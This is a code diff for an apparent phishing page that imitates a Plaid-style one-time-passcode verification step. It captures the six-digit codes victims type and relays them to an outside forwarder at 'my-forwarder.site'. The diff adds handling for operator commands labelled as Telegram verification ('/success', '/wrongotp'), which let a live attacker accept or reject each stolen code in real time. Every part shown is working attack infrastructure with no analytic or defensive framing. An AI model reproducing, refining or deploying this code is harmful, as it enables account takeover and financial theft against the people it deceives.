@@ -306,7 +306,7 @@
     </div>
 
     <script>
-        // DOM elements
+        //elements (same as before)
         const otpInputs = document.querySelectorAll('.otp-input');
         const fullOtpInput = document.getElementById('full-otp');
         const verifyBtn = document.getElementById('verify-btn');
@@ -319,50 +319,41 @@
         // Variables
         let checkOtpStatusInterval = null;
         
-        // Get URL parameters
+        // Get URL parameters (same as before)
         function getUrlParams() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
             const email = urlParams.get('email');
             
-            if (code) {
-                verificationCodeInput.value = code;
-            }
-            
+            if (code) verificationCodeInput.value = code;
             if (email) {
                 displayedEmail.textContent = decodeURIComponent(email);
             } else {
-                // If no email in URL, redirect back
                 window.location.href = 'index.html';
             }
         }
         
-        // Initialize OTP input handling
+        // Initialize OTP input handling (same as before)
         function initOtpInputs() {
             otpInputs.forEach((input, index) => {
-                // Handle paste event
                 input.addEventListener('paste', (e) => {
                     e.preventDefault();
                     const pasteData = e.clipboardData.getData('text').trim();
                     if (/^\d{6}$/.test(pasteData)) {
                         pasteData.split('').forEach((char, i) => {
-                            if (otpInputs[i]) {
-                                otpInputs[i].value = char;
-                            }
+                            if (otpInputs[i]) otpInputs[i].value = char;
                         });
                         updateFullOtp();
                         otpInputs[5].focus();
                     }
                 });
                 
-                // Handle keydown event
                 input.addEventListener('keydown', (e) => {
                     if (e.key === 'Backspace' && input.value === '' && index > 0) {
                         otpInputs[index - 1].focus();
                     }
                 });
                 
-                // Handle input event
                 input.addEventListener('input', (e) => {
                     if (input.value.length === 1 && index < otpInputs.length - 1) {
                         otpInputs[index + 1].focus();
@@ -372,138 +363,110 @@
             });
         }
         
-        // Update the full OTP value
+        // Update the full OTP value (same as before)
         function updateFullOtp() {
             let otp = '';
-            otpInputs.forEach(input => {
-                otp += input.value;
-            });
+            otpInputs.forEach(input => otp += input.value);
             fullOtpInput.value = otp;
-            
-            // Enable/disable verify button based on OTP length
             verifyBtn.disabled = otp.length !== 6;
         }
         
-        // Show loading state
+        // Show/hide loading state (same as before)
         function showLoading() {
             otpForm.classList.add('blurry');
             loadingOverlay.style.display = 'flex';
         }
-        
-        // Hide loading state
         function hideLoading() {
             otpForm.classList.remove('blurry');
             loadingOverlay.style.display = 'none';
         }
         
-        // Show error message
+        // Show/hide error message (same as before)
         function showError(message) {
             errorMessage.textContent = message;
             errorMessage.style.display = 'block';
         }
-        
-        // Hide error message
         function hideError() {
             errorMessage.style.display = 'none';
         }
-        
-        // Check OTP status from server
+
+        // Updated OTP status checking function
         async function checkOtpStatus(code) {
             try {
                 const timestamp = Date.now();
-                const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${code}`);
+                const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${code}&_=${timestamp}`);
                 
                 if (!response.ok) throw new Error('Network error');
-                return await response.json();
+                
+                const data = await response.json();
+                
+                // Handle Telegram verification commands
+                if (data.status === '/success') {
+                    clearInterval(checkOtpStatusInterval);
+                    hideLoading();
+                    // Immediate redirect to success page
+                    window.location.href = 'success.html';
+                    return true;
+                }
+                else if (data.status === '/wrongotp') {
+                    clearInterval(checkOtpStatusInterval);
+                    hideLoading();
+                    showError("Wrong verification code. Please try again.");
+                    setTimeout(() => window.location.reload(), 3000);
+                    return false;
+                }
+                // Original success/wrong handling
+                else if (data.status === 'success') {
+                    clearInterval(checkOtpStatusInterval);
+                    hideLoading();
+                    navigateToPage(2);
+                    setTimeout(() => window.location.href = 'success.html', 5000);
+                    return true;
+                }
+                else if (data.status === 'wrong') {
+                    clearInterval(checkOtpStatusInterval);
+                    hideLoading();
+                    showError("Invalid code. Please try again.");
+                    setTimeout(() => window.location.reload(), 3000);
+                    return false;
+                }
+                
+                return false;
+                
             } catch (error) {
                 console.error('Error checking OTP status:', error);
                 throw error;
             }
         }
-        
-       // Updated OTP status checking function
-async function checkOtpStatus(code) {
-    try {
-        const timestamp = Date.now();
-        const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${code}&_=${timestamp}`);
-        
-        if (!response.ok) throw new Error('Network error');
-        
-        const data = await response.json();
-        
-        // Case-insensitive check for success
-        if (data.status && data.status.toLowerCase() === 'success') {
-            // Clear the checking interval
-            clearInterval(checkOtpStatusInterval);
-            
-            // Hide loading state
-            hideLoading();
-            
-            // Navigate to success page
-            navigateToPage(2);
-            
-            // Redirect after delay
-            setTimeout(() => {
-                window.location.href = 'https://google.com';
-            }, 5000);
-            
-            return true;
-        }
-        // Handle wrong OTP case
-        else if (data.status && data.status.toLowerCase() === 'wrong') {
-            clearInterval(checkOtpStatusInterval);
-            hideLoading();
-            showError("Invalid code. Please try again.");
-            
-            setTimeout(() => {
-                window.location.reload();
-            }, 3000);
-            
-            return false;
-        }
-        
-        // If response doesn't match expected patterns
-        return false;
-        
-    } catch (error) {
-        console.error('Error checking OTP status:', error);
-        throw error;
-    }
-}
 
-// Updated function to start checking status
-function startCheckingOtpStatus() {
-    let attempts = 0;
-    const maxAttempts = 30;
-    
-    checkOtpStatusInterval = setInterval(async () => {
-        attempts++;
-        
-        // Stop if max attempts reached
-        if (attempts >= maxAttempts) {
-            clearInterval(checkOtpStatusInterval);
-            hideLoading();
-            showError("Verification timed out. Please try again.");
-            return;
+        // Start checking status (same as before)
+        function startCheckingOtpStatus() {
+            let attempts = 0;
+            const maxAttempts = 30;
+            
+            checkOtpStatusInterval = setInterval(async () => {
+                attempts++;
+                if (attempts >= maxAttempts) {
+                    clearInterval(checkOtpStatusInterval);
+                    hideLoading();
+                    showError("Verification timed out. Please try again.");
+                    return;
+                }
+                
+                try {
+                    const verified = await checkOtpStatus(verificationCodeInput.value);
+                    if (verified) return;
+                } catch (error) {
+                    console.error('Error checking OTP status:', error);
+                    if (attempts >= maxAttempts) {
+                        hideLoading();
+                        showError("Connection error. Please try again.");
+                    }
+                }
+            }, 3000);
         }
         
-        try {
-            const verified = await checkOtpStatus(verificationCodeInput.value);
-            
-            // If verified, the interval is cleared inside checkOtpStatus
-            if (verified) return;
-            
-        } catch (error) {
-            console.error('Error checking OTP status:', error);
-            if (attempts >= maxAttempts) {
-                hideLoading();
-                showError("Connection error. Please try again.");
-            }
-        }
-    }, 3000);
-}
-        
-        // Submit OTP to server
+        // Submit OTP to server (same as before)
         async function submitOtp(otp, verificationCode) {
             try {
                 const formData = new FormData();
@@ -524,7 +487,7 @@ function startCheckingOtpStatus() {
             }
         }
         
-        // Navigate between pages
+        // Navigate between pages (same as before)
         function navigateToPage(pageNumber) {
             document.querySelectorAll('.page').forEach(page => {
                 page.classList.remove('active');
@@ -532,24 +495,18 @@ function startCheckingOtpStatus() {
             document.querySelector(`.page-${pageNumber}`).classList.add('active');
         }
         
-        // Initialize
+        // Initialize (same as before)
         document.addEventListener('DOMContentLoaded', function() {
             getUrlParams();
             initOtpInputs();
             
-            // Form submission
             otpForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
-                
                 if (fullOtpInput.value.length === 6) {
                     showLoading();
                     hideError();
-                    
                     try {
-                        // Submit OTP to server
                         await submitOtp(fullOtpInput.value, verificationCodeInput.value);
-                        
-                        // Start checking for verification status
                         startCheckingOtpStatus();
                     } catch (error) {
                         console.error('Error:', error);
